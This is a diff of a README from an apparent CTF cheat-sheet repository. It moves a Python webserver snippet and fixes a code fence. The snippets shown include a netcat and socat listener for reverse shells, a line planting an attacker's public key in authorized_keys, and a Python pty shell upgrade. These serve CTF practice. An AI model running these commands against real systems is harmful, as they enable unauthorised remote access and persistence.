@@ -4,11 +4,6 @@ This repo comprises useful code bytes for solving common ctf tasks.
 ## linux privileges
 ##### exploits/privesc for common binaries
 https://gtfobins.github.io/
-##### create python webserver
-```
-python -m SimpleHTTPServer 4004
-python3 -m http.server 4004
-```
 ##### listen for reverse shell connection
 ```bash
 nc -lvp 1234
@@ -19,8 +14,13 @@ socat file:`tty`,raw,echo=0 tcp-listen:12345
 ```bash
 echo "public key on kali" >> authorized_keys
 ```
+##### create python webserver
+```
+python -m SimpleHTTPServer 4004
+python3 -m http.server 4004
+```
 ##### upgrade shell with python
-
+```
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 ##### get current user
